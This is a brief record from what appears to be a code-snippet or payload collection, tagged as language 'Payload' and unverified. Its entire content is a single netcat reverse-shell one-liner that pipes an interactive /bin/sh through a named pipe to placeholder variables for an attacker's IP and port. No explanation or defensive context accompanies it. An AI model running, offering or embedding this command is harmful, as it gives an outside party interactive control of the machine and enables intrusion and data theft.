---
id: 9f8e9ce8-6548-40c7-8a49-bdc848e8e12f
type: code
language: Payload
verified: false
created_at: '2020-03-17T05:41:42.938924+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 9f8e9ce8

**Language**: Payload

```payload
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f
```
